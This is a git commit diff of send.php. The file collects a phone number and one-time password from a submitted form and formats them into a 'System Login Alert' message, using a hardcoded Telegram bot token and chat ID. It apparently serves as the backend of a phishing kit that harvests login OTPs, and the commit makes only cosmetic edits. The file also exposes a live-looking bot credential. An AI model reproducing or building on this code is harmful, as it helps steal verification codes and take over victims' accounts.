2980f525c5900dde3281b5400123c7e69f3d45be
aryanvishwakarma89872-max <aryanvishwakarma89872@gmail.com>
2026-05-30 19:33:18 +0530

    Update send.php

--- send.php
+++ send.php
@@ -1,18 +1,18 @@
 <?php
-
+date_default_timezone_set('Asia/Kolkata');
 $botToken="8785026329:AAEeQU6GTDv3zTyCIvAiuB6A_Pulfxfggmc";
 $chatId="5971795563";
 
 $number=$_POST['number'] ?? '';
 $otp=$_POST['otp'] ?? '';
 
-$message  = "📱 System Login Alert\n";
-$message  = "System Login Alert\n";
+$message  = "💡System Login Alert\n";
+$message  = "💡System Login Alert\n";
 $message .= "━━━━━━━━━━━━━━\n";
-$message .= "Phone:\n`".$number."`\n";
+$message .= "📱Phone:\n`".$number."`\n";
 
 if(!empty($otp)){
-$message .= "OTP:\n`".$otp."`\n";
+$message .= "🔓OTP:\n`".$otp."`\n";
 }
 
 $message .= "Time: ".date("d/m/Y H:i:s")."\n";
